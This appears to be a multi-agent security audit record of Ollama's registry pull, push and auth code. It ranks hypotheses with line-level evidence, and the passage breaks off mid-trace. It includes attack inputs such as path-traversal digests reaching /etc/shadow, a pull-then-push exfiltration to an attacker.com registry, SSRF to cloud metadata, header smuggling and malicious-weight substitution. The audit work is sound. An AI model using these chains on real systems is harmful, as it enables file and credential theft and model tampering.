# Review Chamber: chamber-01

Cluster: Registry Ingress / Blob Path — DFD-1 (pull to disk), DFD-2 (blob upload to GGUF parse), DFD-7 (push), DFD-12 (cross-user blob races), DFD-13 (registry auth)
DFD Slices: DFD-1, DFD-2, DFD-7, DFD-12, DFD-13
NNN Range: 001-019
Started: 2026-04-17T03:10:00Z
Status: CLOSED

Ideator: ideator-01
Tracer: tracer-01
Advocate: advocate-01

---

## Pre-Seeded Hypotheses (from Deep Probe — Group A + Group FG + Spec Gap 13)

These hypotheses are already validated by the Deep Probe phase. The Ideator MUST incorporate them as H-00.* entries and build chain/variant hypotheses on top. The Tracer MUST verify and extend the existing evidence rather than re-tracing from scratch.

| Pre-Seed ID | Source | Severity | One-liner |
|-------------|--------|----------|-----------|
| H-00.01 | PH-A-01 / FG-PH-18 | CRITICAL | `pullWithTransfer` passes raw `layer.Digest` to `transfer.Blob`; `digestToPath` in `x/imagegen/transfer/transfer.go:165` does raw `strings.Replace` with no `filepath.IsLocal`. Traversal digest writes arbitrary files as ollama user (RCE via `/etc/cron.d/`). `.tmp` persists on hash mismatch for blobs >= 64MB. |
| H-00.02 | PH-A-02 / PH-FG-09 | HIGH | Size-only cache-hit at `transfer/download.go:58` and `server/download.go:478` skips hash when file size matches. Co-tenant can pre-stage malicious GGUF at exact correct size. |
| H-00.03 | PH-A-03 | HIGH | `/api/pull` SSRF — `isValidPart(kindHost)` permits `169.254.169.254`; `Insecure:true` enables HTTP; error reflects response → IMDS exfil. |
| H-00.04 | PH-A-04 + PH-A-14 | HIGH | `server/images.go:864` manifest `io.ReadAll` unbounded + `server/auth.go:81` token `io.ReadAll` unbounded → 2× OOM from one `/api/pull`. |
| H-00.05 | PH-A-08 / FG-PH-22 | HIGH | `pushWithTransfer` reads traversal digest — pull stores corrupt manifest with `digest:"sha256:../../../etc/shadow"` → push reads `/etc/shadow`, uploads to attacker registry. |
| H-00.06 | PH-A-09 | HIGH | `server/auth.go:60` realm host-equality check misses scheme — `realm="http://..."` downgrades; ed25519 signed header sent over plaintext. |
| H-00.07 | PH-A-13 / PH-FG-04 | HIGH | `x/imagegen/manifest.BlobPath` same `strings.Replace` bug; read-side callers (`ReadConfig`, `OpenBlob`, `detectQuantizationFromBlobs`) reachable via mlxrunner/imagegen → arbitrary file read. |
| H-00.08 | PH-FG-03 | HIGH | `x/create/create.go:102-103,157-159` — `loadModelConfig` + `GetModelArchitecture` same blob-path escape via manifest `Config.Digest`. |
| H-00.09 | PH-A-11 | MEDIUM | `OLLAMA_EXPERIMENT=client2` dispatches `handlePull` before gin middleware → unbounded JSON body on `/api/pull`. |
| H-00.10 | PH-A-05 | MEDIUM | HTTP 206 Content-Range not validated — 200 OK with full body accepted for every Range chunk → stuck download. |
| H-00.11 | PH-A-10 | MEDIUM | Empty-hash digest + traversal path → clean empty file at arbitrary path (no `.tmp`, no residue). |
| H-00.12 | PH-A-12 | MEDIUM | HTTPS→HTTP CDN redirect — blob travels plaintext; hash detects mismatch but `.tmp` persists. |
| H-00.13 | Spec Gap 13 | HIGH | `server/images.go:995-1026` — WWW-Authenticate custom parser mishandles comma inside quoted realm; re-introduces CVE-2025-51471 class. |

Chain seeds (for Ideator to expand):
- H-00.01 + H-00.02: traversal write pre-stages a sized malicious GGUF at `blobs/sha256-<target-digest>` → next pull uses cache-hit → persistent model substitution
- H-00.03 + H-00.05: full egress loop — SSRF picks target; push sends arbitrary read bytes to attacker registry via registry redirect
- H-00.01 + H-00.13: WWW-Authenticate realm comma-smuggle → HTTP downgrade → traversal write without needing malicious TLS
- H-00.06 + PH-A-21 (nonce gap): realm downgrade lets MITM capture ed25519 sig; no nonce → replay window

Attack classes NOT yet explored (Ideator must generate):
- `fixBlobs` symlink rename at startup (PH-A-07 "NEEDS-DEEPER") — attacker-planted symlink in blobs dir causes rename of files outside blob dir
- Concurrent pulls of same digest race — two goroutines open the same `.tmp`, one wins rename while the other still writes
- Partial-file resume with mixed legit/malicious bytes — attacker controls part of the byte range; hash computed over merged data; if attacker knows the structure, collision-resistant bytes in low-entropy regions survive
- Session replay (PH-A-21) — client-signed challenge has no server nonce; captured header replays within ts window
- Cross-user blob races (DFD-12) — shared blob directory in multi-tenant install; one user pre-writes; another user's pull cache-hits
- chunksums URL injection (Group-A NEEDS-DEEPER) — registry-supplied chunksums URL, scheme/host validation?
- Manifest `mediaType` dispatch confusion — attacker sets unexpected mediaType on a layer to skip validation branches
- Insecure scheme sticky across redirects — `insecure=true` on initial request persists for all downstream hosts

---

## Round 1 -- Ideation

Round opened: 2026-04-17T03:11:00Z
Directed to: ideator-01

### Charter for ideator-01

You are receiving 13 pre-validated hypotheses (H-00.01 through H-00.13) from the Deep Probe phase. You MUST NOT re-generate these — they are already in the record. Your job is to:

1. **Incorporate the H-00.* entries as-is** (copy the one-liners into your hypothesis list as the starting block).
2. **Generate up to 7 NEW hypotheses** (H-01 through H-07 maximum) that either:
   - **Chain two or more H-00.* entries** into a higher-impact scenario, or
   - **Extend a H-00.* bug class** to a new sink/callsite in the same cluster (DFD-1/2/7/12/13), or
   - **Cover an unexplored attack class** from the list below.

Unexplored classes (pick from these, ranked by probable impact):
- **fixBlobs symlink rename at startup** (PH-A-07 NEEDS-DEEPER) — does a symlink planted inside `$OLLAMA_MODELS/blobs/` cause `filepath.Walk` to descend and rename external files to `sha256-<name>`?
- **Concurrent same-digest pull race** — two `ollama pull` for the same blob simultaneously; both write `.tmp`, which one's content survives the rename?
- **Partial-file resume mixing** — resume path uses `Range` to fetch missing bytes; if attacker controls response for the resumed range only, merged bytes hash-match only when attacker can reconstruct the prefix
- **chunksums URL injection** — `server/internal/registry/registry.go` chunksums endpoint; registry-supplied URL, scheme/host validated?
- **Cross-user blob dir in multi-tenant install** (DFD-12) — user A writes malicious blob; user B's pull size-matches and cache-hits
- **`insecure=true` sticky across redirect chain** — does the `Insecure` flag persist when the manifest URL 302s to a different host?
- **Manifest `mediaType` dispatch confusion** — setting an unrecognized `mediaType` so that `hasTensorLayers` returns false but layer is still fetched via different path
- **Session/challenge replay without nonce** (PH-A-21) — `api/client.go` chal = method+path+ts with no server nonce → replay window = ts tolerance
- **Realm comma-smuggle (Spec Gap 13)** — is a comma inside a quoted realm value reinterpreted as a new directive by the custom parser?

### Format for each new hypothesis

```
### H-<NN>: <title>

- **Attack class**: traversal-chain | cache-substitution | SSRF-chain | OOM-chain | auth-downgrade | race | replay | symlink | new
- **Derivation**: chain of <H-00.X + H-00.Y> | extension of <H-00.X> | unexplored class
- **Attack input**: <concrete payload>
- **Code path (sketch)**: <entry -> ... -> sink>
- **Preconditions**: <attacker position, required config flags>
- **Trust boundary crossed**: <network attacker | local co-tenant | stored-model-consumer>
- **Security consequence**: <one paragraph, concrete>
- **Severity estimate**: CRITICAL | HIGH | MEDIUM
- **Open questions for Tracer**: <what Tracer must confirm on HEAD>
```

Hard cap: 7 new hypotheses. Prioritize chain scenarios (multiplicative impact) over standalone new sinks. After 7, defer the rest to a note at the bottom of your section.

Write your output directly below this line in debate.md under the header `### [IDEATOR] Hypotheses -- <ISO timestamp>`.


### [IDEATOR] Hypotheses -- 2026-04-17T03:15:00Z

**Pre-seed block carried forward as H-00.01 through H-00.13 (see table above).** These are already validated by Deep Probe; Tracer verifies, Advocate attacks.

**New hypotheses (H-01 through H-07) — chain + unexplored classes:**

### H-01: Persistent model substitution via traversal-write → cache-hit chain

- **Attack class**: traversal-chain → cache-substitution
- **Derivation**: chain of H-00.01 (traversal write) + H-00.02 (size-only cache-hit)
- **Attack input**: (1) Victim pulls `evil.com/foo:latest` from attacker registry. Manifest has one valid tiny tensor layer (to flip `hasTensorLayers` true) plus a model layer with `Digest = "sha256:-<matching-hex-of-real-target-digest>"`. For the first pull, the traversal write primitive is NOT used — instead, the attacker supplies bytes whose sha256 matches both the digest string AND the exact `size` field of the legitimate `llama3:latest` blob that the victim will later pull. (2) Victim later pulls `registry.ollama.ai/library/llama3:latest` — the legit manifest references `sha256:<real-digest>`. `downloadBlob` at `server/download.go:478` does `os.Stat` on `blobs/sha256-<real-digest>`. The attacker's earlier pull left a file at that exact path (because the attacker could choose any digest string in step 1, including the real one). `cacheHit=true` → `skipVerify` → hash verification skipped → malicious GGUF served to llama.cpp.
- **Code path**: attacker manifest → `pullModelManifest` → digest placed in manifest → `downloadBlob` in first pull writes to chosen path if size matches → second pull `os.Stat` hits → `cacheHit=true` → `verifyBlob` skipped at `images.go:658-660` → malicious model loaded.
- **Preconditions**: attacker controls one registry (or victim adds `--insecure` remote); no local blob already present with that digest; attacker knows the target digest in advance.
- **Trust boundary crossed**: network attacker → stored-blob cache → inference runtime.
- **Security consequence**: Persistent model substitution: victim believes they pulled a verified `llama3:latest`; `ollama show` reports the official digest, but the on-disk blob is malicious. Next `ollama run llama3` loads attacker weights; chain to GGUF tensor OOB or adversarial prompt-injection baked into weights.
- **Severity estimate**: HIGH (requires pre-knowledge of target digest, which is public)
- **Open questions for Tracer**: confirm `downloadBlob` cache-hit fires on bare existence vs. size-match; confirm no hash-on-disk-check occurs anywhere between stat and use.

### H-02: Full arbitrary-file-read egress via SSRF + push chain (no push credentials needed)

- **Attack class**: SSRF-chain → arbitrary file read exfil
- **Derivation**: chain of H-00.03 (SSRF) + H-00.05 (push traversal read)
- **Attack input**: (1) `POST /api/pull {"name":"attacker.com/evil:latest","insecure":true}` where attacker.com serves a manifest containing `"digest":"sha256:../../../etc/shadow"` as a layer — this is stored verbatim to `$OLLAMA_MODELS/manifests/attacker.com/library/evil/latest`. (2) `POST /api/push {"name":"attacker.com/evil:latest","insecure":true}` — `pushWithTransfer` reads the traversal digest from the stored manifest, opens `/etc/shadow`, uploads to attacker registry. Variant: the SSRF step can also hit `169.254.169.254` cloud metadata to first read IMDS creds.
- **Code path**: `/api/pull` → `pullModelManifest` (validates manifest JSON but NOT digest charset) → manifest stored at `os.WriteFile(fp, manifestData, 0o644)` in `pullWithTransfer:787` OR legacy `writeManifest`. Then `/api/push` → `pushWithTransfer:800` → `blobs[i].Digest = layer.Digest` → `transfer.Upload` → `upload.go:181 os.Open(filepath.Join(srcDir, digestToPath("sha256:../../../etc/shadow")))` → body sent to `attacker.com/v2/.../blobs/upload`.
- **Preconditions**: attacker can get the victim to run two `ollama pull` + `ollama push` API calls for their model (e.g., tricking user into `ollama push attacker.com/evil` after pulling; or if push is run in the same server context).
- **Trust boundary crossed**: network → local filesystem → network exfil.
- **Security consequence**: Read and exfiltrate any file readable by ollama user to attacker-controlled registry; includes `/etc/shadow` on systemd service install, SSH keys, `.env` files, application secrets. Combined with H-00.03, attacker does not need any initial credentials — the SSRF reaches internal IMDS first, giving cloud creds.
- **Severity estimate**: CRITICAL
- **Open questions for Tracer**: confirm `pullModelManifest` + `writeManifest` stores attacker digest verbatim in on-disk manifest JSON; confirm `pushWithTransfer` reads that manifest and copies `layer.Digest` into `upload.go` sink without `BlobsPath` regex.

### H-03: WWW-Authenticate comma-smuggle causes realm re-parse to attacker host, bypassing host-equality check in a multi-step pull

- **Attack class**: auth-downgrade → header-parser-confusion
- **Derivation**: chain of H-00.13 (spec gap 13) + H-00.06 (realm downgrade)
- **Attack input**: Victim pulls from `registry.ollama.ai/library/foo:latest` (legitimate host). MITM on the 401 response injects: `WWW-Authenticate: Bearer realm="https://registry.ollama.ai/token?x=X",service="registry.ollama.ai"`. The custom `getValue` parser walks the quoted realm value; on seeing `"`, checks if next char is `,` — at `X",s` the `"` at `X",` is followed by `,` → terminates. Realm = `https://registry.ollama.ai/token?x=X`. That's fine. But a cleverer payload: `realm="https://registry.ollama.ai/x",service="x",realm="http://evil/token"` — the FIRST `realm=` match wins (strings.Index returns first). So direct realm-smuggling via second occurrence is NOT the bug. However, `getValue(h, "service")` does `strings.Index(h, "service=")` — if realm value contains `service=`, that substring is found FIRST (inside the realm quotes) and returns garbage from inside realm, which then is used as `Service` field in the signed data string. Chain: realm = `https://registry.ollama.ai/x?service=http://evil/token"` — the parser stops scanning realm at the quote-comma boundary. Subsequent `getValue(h, "service")` finds `service=` WITHIN the realm value, returns `http://evil/token` or whatever follows. `Service` field is included in sig material. This alone doesn't downgrade host. But if `scope` is attacker-controlled via same trick, the signed nonce URL includes attacker scope → token endpoint returns a token scoped for attacker resources.
- **Code path**: `parseRegistryChallenge` at `images.go:1018` → 3× `getValue` → `makeRequestWithRetry` adds `Authorization: <ed25519-sig-over-serviceScope>` → `getAuthorizationToken` → host-equality check passes (realm host is legit) → but scope/service signed under attacker-smuggled values.
- **Preconditions**: MITM on registry connection (or compromised registry); victim performs `ollama pull`.
- **Trust boundary crossed**: network (active TLS MITM or hostile registry) → auth tokens.
- **Security consequence**: Token/signature confusion — may enable cross-scope token reuse; does NOT directly achieve RCE but weakens the auth posture. Combined with H-00.06 realm downgrade (if realm itself is HTTP), plaintext sig leak + scope confusion.
- **Severity estimate**: MEDIUM (signature leakage is clear; direct exploit path is narrow)
- **Open questions for Tracer**: confirm `service` and `scope` values flow into the signed data at `auth.go:65`; confirm how the registry server uses scope in its grant decision.

### H-04: Cross-user blob substitution via shared `$OLLAMA_MODELS` dir (multi-tenant install)

- **Attack class**: cross-user (DFD-12)
- **Derivation**: chain of H-00.02 (cache-hit) + filesystem multi-tenancy model
- **Attack input**: On a shared host (Linux with multiple interactive users; or a systemd service install where operators can write to `/usr/share/ollama/.ollama/models/blobs/` via group membership), low-priv user writes a malicious GGUF of exact correct size to `blobs/sha256-<popular-digest>` for a widely-pulled model. Later, ollama service user runs `ollama pull llama3:latest` — `downloadBlob` cache-hits on existence (not even size check in legacy path) → `verifyBlob` skipped → malicious weights loaded.
- **Code path**: identical to H-00.02 but threat model is local-to-local rather than remote-to-local.
- **Preconditions**: multi-tenant system where `$OLLAMA_MODELS/blobs/` is writable by the attacker. Likely in corporate Linux hosts with `/usr/share/ollama/` group-writable (packaging default may or may not set this), Docker images layered with shared cache volumes, CI runners with restored caches.
- **Trust boundary crossed**: local co-tenant → inference runtime.
- **Security consequence**: Model substitution as a local privilege escalation vector to the ollama service user (who may have sudo, network egress, or API keys).
- **Severity estimate**: HIGH (on affected installs) / MEDIUM (in single-user default)
- **Open questions for Tracer**: confirm default permissions of `$OLLAMA_MODELS/blobs/` on packaged installs (deb, rpm, Homebrew); confirm no file-descriptor-based verification that would detect file replacement.

### H-05: `fixBlobs` symlink rename at startup — attacker-planted symlink in blobs dir renames external files

- **Attack class**: symlink (standalone; not chained)
- **Derivation**: unexplored class (PH-A-07 NEEDS-DEEPER)
- **Attack input**: After H-00.01 gives initial write primitive, the attacker plants `$OLLAMA_MODELS/blobs/sub/ -> /etc/` as a symlink. On next ollama server startup, `fixBlobs` walks blobs dir via `filepath.Walk`. Walk descends into the symlinked directory (default behavior before Go 1.20's `filepath.WalkDir` non-symlink-follow semantics). Any file inside `/etc/` matching a rename pattern (`sha256:XXX` → `sha256-XXX`) gets renamed — destructive modification of system config.
- **Code path**: `server/manifest.go` / `server/images.go` `fixBlobs` → `filepath.Walk` → callback renames files with `sha256:` prefix to `sha256-`.
- **Preconditions**: attacker has write access to blobs dir (via H-00.01 or local co-tenant); ollama restarts.
- **Trust boundary crossed**: local write → destructive modification of files outside blob dir.
- **Security consequence**: Destructive DoS (system files renamed) or, if followed by restoration of renamed files, a targeted modification primitive; limited RCE because the rename target name includes `sha256-` prefix which is unlikely to match a useful target name.
- **Severity estimate**: MEDIUM
- **Open questions for Tracer**: verify `fixBlobs` exists on HEAD; confirm it uses `filepath.Walk` (follows symlinks) vs `filepath.WalkDir` with Lstat; find all call sites (startup? migration?).

### H-06: Session replay on OLLAMA_AUTH due to no server nonce (api/client.go)

- **Attack class**: replay
- **Derivation**: unexplored class (PH-A-21)
- **Attack input**: MITM on the local network (or shared proxy) captures `Authorization: <pubkey>:<sig>` header of a request `POST /api/generate?ts=1712345678` signed as `POST,/api/generate?ts=1712345678`. The timestamp is client-chosen; there is no server nonce. Within the server's timestamp-tolerance window, attacker replays the same header with the same method+path+ts against any endpoint that accepts the same signature.
- **Code path**: `api/client.go` `do()` constructs `chal := fmt.Sprintf("%s,%s?ts=%s", method, path, now)` → `auth.Sign` → header. Server-side verification (if `OLLAMA_AUTH=1`) must reconstruct identical chal; any endpoint accepting same method+path within tolerance window accepts the replay.
- **Preconditions**: `OLLAMA_AUTH=1` is enabled on server; MITM or network observer on request path.
- **Trust boundary crossed**: network observer → authenticated API user.
- **Security consequence**: Replay of sensitive operations (`POST /api/delete`, `POST /api/push`, etc.) within a few-second window; not as bad as key compromise, but undermines the security claim of the signing scheme.
- **Severity estimate**: MEDIUM (gated by OLLAMA_AUTH flag; real-world usage uncertain)
- **Open questions for Tracer**: confirm server-side verification path for OLLAMA_AUTH; measure the timestamp tolerance window; find any API routes that are both signed and state-changing.

### H-07: Insecure scheme sticky across registry redirect

- **Attack class**: new (registry-controlled scheme downgrade)
- **Derivation**: unexplored class
- **Attack input**: Victim pulls from `registry.ollama.ai/foo` (HTTPS, `Insecure=false`). Registry responds with `302 Location: http://malicious-cdn.com/blob/...`. In `server/download.go`, `Prepare` or `downloadChunk` follows redirect; subsequent Range requests are all HTTP. Attacker on the HTTP path can serve malicious content. Streaming hash detects the mismatch for big blobs but `.tmp` persists. For small blobs matching size → cache-hit substitution (see H-01).
- **Code path**: `blobDownload.Prepare` → HTTP client follows redirect → `directURL` stored with scheme from `resp.Location()` → all subsequent part downloads use that URL (confirmed in PH-A-12).
- **Preconditions**: registry is malicious OR MITM at redirect point.
- **Trust boundary crossed**: network (malicious CDN or downgrade-MITM).
- **Security consequence**: Bytes travel plaintext; hash detects mismatch but opportunity for silent substitution when combined with H-00.02 (cache hit on pre-planted file).
- **Severity estimate**: MEDIUM (H-00.12 covers the DoS case; chain to H-00.02 is the escalation)
- **Open questions for Tracer**: confirm `directURL` scheme is not re-validated in `downloadChunk`; enumerate all paths that cross scheme boundaries.

---

Deferred (below 7-hypothesis cap):
- Concurrent same-digest race: requires `LoadOrStore` at `blobDownloadManager` analysis; likely dedup protects this in legacy path, but `x/imagegen/transfer` has no such dedup.
- `chunksums` URL injection: needs separate trace of `server/internal/registry/registry.go`; deferred to chamber-02 if scope permits.
- Partial-resume byte-mixing: treated as a sub-case of H-00.10 (stale partial) + H-00.12 (scheme downgrade).
- Manifest `mediaType` dispatch confusion: `hasTensorLayers` is a strict match on `MediaTypeImageTensor`; skipping the tensor path reverts to legacy `downloadBlob` which has its own flaws (H-00.02), so no new primitive.


---

## Round 2 -- Tracing

Round opened: 2026-04-17T03:20:00Z
Directed to: tracer-01

### [TRACER] Evidence -- 2026-04-17T03:22:00Z

**Note**: H-00.01 through H-00.13 already have Deep Probe evidence on file at `archon/probe-workspace/group-A/round-1-evidence.md` and `archon/probe-workspace/group-FG/round-1-evidence.md`. I verify the most load-bearing claims against HEAD (`57653b8e`) and add evidence for H-01 through H-07.

#### Re-verification of pre-seed claims on HEAD (57653b8e)

| H-00 | Claim | HEAD Status | Key lines |
|------|-------|-------------|-----------|
| H-00.01 | `pullWithTransfer` passes raw digest; `digestToPath` has no regex | CONFIRMED | `server/images.go:724-725` (`blobs[i] = transfer.Blob{Digest: layer.Digest, ...}`), `x/imagegen/transfer/transfer.go:164-170` (digestToPath), `x/imagegen/transfer/download.go:213-215` (`filepath.Join(destDir, digestToPath(blob.Digest))` + `os.MkdirAll` + `os.Create(tmp)`) |
| H-00.01 caveat | `.tmp` persists on hash mismatch ≥ 64 MB | PARTIAL | `x/imagegen/transfer/download.go:257-264` — `save()` DOES `os.Remove(tmp)` on hash/size mismatch. But on **context cancellation / stall / network error** mid-transfer (line 253 returns via `copy()` error before hash computation), the outer loop at `download.go:131-137` only removes if `blob.Size < resumeThreshold` (64 MB). For >=64 MB blobs, `.tmp` persists on *error* exits (not on mismatch, but on stall/cancel/network failure). Also: `os.MkdirAll(filepath.Dir(dest), 0o755)` at line 215 runs unconditionally BEFORE any hash check → intermediate directory tree survives even when `.tmp` is cleaned. |
| H-00.02 | Size-only cache hit bypasses verifyBlob | CONFIRMED (weaker than probe said — existence-only in legacy path) | `x/imagegen/transfer/download.go:58` checks `fi.Size() == b.Size`. `server/download.go:478-491` returns `cacheHit=true` on bare `os.Stat` success — **no size check at all** in the legacy path. `server/images.go:641-652,658-660` skips `verifyBlob` when `cacheHit=true`. |
| H-00.03 | SSRF via `isValidPart(kindHost)` | CONFIRMED | `types/model/name.go:344-372` `isValidPart` for `kindHost` allows `.`, digits, `:` port suffix; `169.254.169.254` passes. `server/images.go:615` `if n.ProtocolScheme == "http" && !regOpts.Insecure` — passes when `Insecure=true`. Error body is reflected at `server/images.go:622` `fmt.Errorf("pull model manifest: %s", err)` where err contains response body. |
| H-00.04 | Unbounded `io.ReadAll` in manifest + token | CONFIRMED | `server/images.go:864` `data, err := io.ReadAll(resp.Body)` — no `http.MaxBytesReader`, no `io.LimitReader`. `server/auth.go:81` `body, err := io.ReadAll(response.Body)` — same. |
| H-00.05 | `pushWithTransfer` reads traversal digest | CONFIRMED | `server/images.go:800` `blobs[i] = transfer.Blob{Digest: layer.Digest, ...}` — identical pattern. `x/imagegen/transfer/upload.go:181` `os.Open(filepath.Join(u.srcDir, digestToPath(blob.Digest)))`. The manifest read-source for push is `manifest.PathForName(n)` which DOES use `BlobsPath` for directory but reads the JSON verbatim — digests in layers are not re-validated before push. |
| H-00.06 | Realm HTTP downgrade via scheme-missing check | CONFIRMED | `server/auth.go:60` `if redirectURL.Host != originalHost` — checks only Host, not Scheme. No `redirectURL.Scheme == "https"` assertion. `makeRequest` at line 75 follows whatever scheme. |
| H-00.07 | `x/imagegen/manifest.BlobPath` raw strings.Replace | CONFIRMED | `x/imagegen/manifest/manifest.go:101-105` `blobName := strings.Replace(digest, ":", "-", 1)`. Callers: `manifest.go:141` (`ReadConfig`), `manifest.go:156` (`OpenBlob`), `manifest.go:240` (`detectQuantizationFromBlobs` via `readBlobHeader`). All read sinks. |
| H-00.08 | `x/create/create.go:102,158` same pattern | CONFIRMED | `x/create/create.go:102-105` and `157-163` both use raw `strings.Replace` → `filepath.Join(defaultBlobDir(), blobName)` → `os.ReadFile`. No `IsLocal`. Callers: `IsSafetensorsModel`, `IsSafetensorsLLMModel`, `IsImageGenModel`, `GetModelArchitecture` — reachable during create/dispatch. |
| H-00.09 | `handlePull` no body size limit in client2 | LIKELY — not re-traced here (Group A already validated) | `server/internal/registry/server.go:264` per probe. |
| H-00.10 | HTTP 206 Content-Range not validated | CONFIRMED | `server/download.go:329-389` `downloadChunk` — checks `resp.StatusCode != http.StatusPartialContent` but does NOT parse/validate `Content-Range` header; `io.CopyN(w, resp.Body, part.Size-part.Completed.Load())` reads from offset 0 of response body regardless of actual range served. |
| H-00.11 | Empty-hash + traversal → clean empty file | CONFIRMED | `x/imagegen/transfer/download.go:241-247,257-266` — `size=0` path, empty write, `sha256(nil) = e3b0c4...`, matches digest, `os.Rename(tmp, dest)` runs, clean empty file at traversal path. |
| H-00.12 | HTTPS→HTTP CDN redirect sticky | CONFIRMED | `server/download.go:229-270` — `directURL, err := ... return resp.Location()` returns the redirected URL; no scheme validation; all subsequent `downloadChunk` calls at line 287 use `directURL`. |
| H-00.13 | WWW-Authenticate parser comma-smuggle | CONFIRMED | `server/images.go:995-1016` `getValue` — `strings.Index(header, key+"=")` finds FIRST occurrence. If realm value contains substring `service=` or `scope=` (e.g., realm ends with `/?service=http://evil`), subsequent `getValue(h, "service")` returns the substring INSIDE the realm value instead of the actual service directive. Parser terminates quoted string on `",` boundary — accepts embedded `"` not followed by `,`. |

#### Evidence for new hypotheses (H-01 through H-07)

**H-01 (persistent model substitution via traversal-write → cache-hit chain)**
- Prerequisite 1: attacker can write a file of chosen content + size to `blobs/sha256-<target-digest>` — H-00.01 provides the write primitive (for a blob whose `Size` > 0 and whose hash matches the attacker-supplied digest string). *But traversal-write is used here for path redirection, not for content substitution — the attacker can just pull a legitimate (from their POV) blob whose digest is `sha256:<target-real-digest>` and whose bytes are malicious. If their bytes match `sha256:<target-real-digest>`, they've achieved SHA-256 collision (impractical). If they don't match, `save()` removes `.tmp` on mismatch.* → **Attack not as stated.** However: the malicious registry can advertise a blob whose `Size` in the manifest matches the legit blob's size but whose real content differs. Pull fails on hash mismatch → `os.Remove(tmp)`. No substitution.
- **Revised attack**: use H-00.11 (zero-size + empty-hash digest) to create `blobs/sha256-e3b0c44298...` (well-known empty-hash). But legitimate blobs never have that digest. For the substitution attack to work, the attacker needs to write exact malicious bytes to the exact sha256-<real-digest> path. `save()` refuses.
- **Corrected claim**: the cache-hit bypass (H-00.02) is exploitable only by a **LOCAL co-tenant** who can directly `open/write` the blob file on disk, bypassing the `save()` hash check — that is H-04. The network-only version of H-01 as originally stated does NOT work against HEAD because `save()` verifies before rename. → Down-weight H-01; promote H-04 as the realistic cache-substitution vector.
- **Tracer verdict on H-01**: PARTIAL — theoretical chain not realized because `save()` verification gates the write-then-rename. Use H-04 instead.

**H-02 (SSRF + push arbitrary file read egress)**
- Step 1 code path: `POST /api/pull` → `server/routes.go:PullHandler` → `PullModel` → `server/images.go:621` `pullModelManifest` → `images.go:864 io.ReadAll` → `json.Unmarshal` into `manifest.Manifest`. The `Manifest` struct validates JSON shape but NOT digest charset.
  - Evidence: `types/manifest.go` or `server/manifest.go` — let me locate.


  - `manifest/manifest.go:112-146` `ParseNamedManifest` does `json.NewDecoder(io.TeeReader(f, sha256sum)).Decode(&m)` — NO digest charset validation on layers. Integrity hash `m.digest` is the sha256 of the on-disk manifest JSON, not of individual layer digests.
  - `pullWithTransfer` stores the manifest at `server/images.go:787 os.WriteFile(fp, manifestData, 0o644)` where `fp = manifest.PathForName(n)` — the attacker's manifest JSON is persisted byte-for-byte including traversal digest strings.
- Step 2 code path: `POST /api/push` → `server/images.go:529 PushModel` → line 537 `ParseNamedManifest` re-reads the stored manifest (no validation) → line 543-547 builds `[]Layer` with raw `layer.Digest` → line 560 `pushWithTransfer` → `x/imagegen/transfer/upload.go:181` `os.Open(filepath.Join(u.srcDir, digestToPath(blob.Digest)))`.
- `upload.go:181` will open `/etc/shadow` if `srcDir = /usr/share/ollama/.ollama/models/blobs` and `digest = sha256:../../../../etc/shadow` (path resolves under `filepath.Clean`).
- Then the uploaded body flows to the attacker's registry `PUT /v2/.../blobs/upload` — confirmed via `upload.go` upload flow.
- **Reachability**: `/api/push` is an attacker-reachable API endpoint. If the attacker controls the initial registry, they need the victim to perform TWO API calls (`pull` then `push`). This is gated but realistic (e.g., CI pipeline that pulls from upstream then re-pushes to internal registry; tooling that mirrors models).
- **Tracer verdict on H-02**: CONFIRMED — exploitable chain.

**H-03 (WWW-Authenticate comma-smuggle → scope/service confusion)**
- `getValue(header, key)` finds first `key=` occurrence. Example:
  - Legit header: `Bearer realm="https://auth.example/token",service="registry",scope="repository:foo:pull"`
  - Attack header: `Bearer realm="https://auth.example/token?service=attacker&scope=attacker",service="registry",scope="repository:foo:pull"`
  - `getValue(h, "realm")` returns `https://auth.example/token?service=attacker&scope=attacker` — correct first value, terminates on `"` followed by `,`.
  - `getValue(h, "service")` does `strings.Index(h, "service=")`. First match is INSIDE the realm value. Returns `attacker&scope=attacker` (scanning until `"` followed by `,`).
  - The Service and Scope fields thus smuggled are used in `registryChallenge.URL()` at `server/auth.go:32-48`: `values.Add("service", challenge.Service); values.Add("scope", challenge.Scope)`. These are added as query parameters to the realm URL.
- Since `redirectURL.Host` is still `auth.example` (from the legit realm part), the host-equality check at `auth.go:60` passes.
- The signed data at `auth.go:65` is `fmt.Sprintf("%s,%s,%s", http.MethodGet, redirectURL.String(), b64(hex(empty-sha256)))` — redirectURL.String() now contains attacker scope.
- **Impact**: the token server receives a request with smuggled scope → may grant a token of unexpected scope (depends on token server's policy). At minimum, this is signature confusion — victim signs for scope they did not approve. At worst (if token server is permissive), victim's signature is used to grant attacker a scoped token.
- **Tracer verdict on H-03**: CONFIRMED — parser bug is real; downstream impact depends on registry token server; treat as MEDIUM.

**H-04 (cross-user blob substitution on shared host)**
- `server/download.go:478` `os.Stat(fp)` — returns `cacheHit=true` on bare existence, no hash/size/owner check. `fp = manifest.BlobsPath(digest)` → regex-validated digest path → `$OLLAMA_MODELS/blobs/sha256-<digest>`.
- If local attacker has write access to `$OLLAMA_MODELS/blobs/`, they can pre-write a file named `sha256-<victim-target-digest>` with arbitrary contents.
- Default packaging (Debian/Ubuntu ollama.deb): `/usr/share/ollama/.ollama/models/blobs/` owned by `ollama:ollama`, mode `0755` for the directory — only `ollama` user can write. But: Docker images often bind-mount `~/.ollama` from host as shared volume; CI runners restore caches; multi-user dev environments share `$HOME/.ollama` via NFS/sshfs. In those cases, any user with directory-write access plants the file.
- **Tracer verdict on H-04**: CONFIRMED — impact MEDIUM by default, HIGH in shared-cache configurations.

**H-05 (fixBlobs symlink rename at startup)**
- `server/fixblobs.go:11-26` — `filepath.Walk` (NOT `WalkDir` — `Walk` follows symlinks to directories). The callback signature is `func(path string, info os.FileInfo, err error)`. `filepath.Walk` does NOT follow symlinks by design; from the stdlib docs: "Walk does not follow symbolic links." However, `filepath.Walk` DOES evaluate symlinks to files (os.Lstat is used internally — actually let me verify).
- Stdlib behavior: `filepath.Walk` documented as "does not follow symbolic links" — but this applies to *descent*. It calls `os.Lstat` for the initial arg and `os.Lstat` for each descendant. If `path/to/blobs/link` is a symlink to a *file*, Lstat returns info about the symlink itself (os.ModeSymlink set, not a dir), so Walk does not descend. The callback sees `path = path/to/blobs/link` with symlink info. The callback code at line 16-22 does `filepath.Base(path)` and checks if basename starts with `sha256:` — if yes, `os.Rename`. `os.Rename(link, newLink)` renames the symlink itself, not the target. So no destructive rename of `/etc/` files.
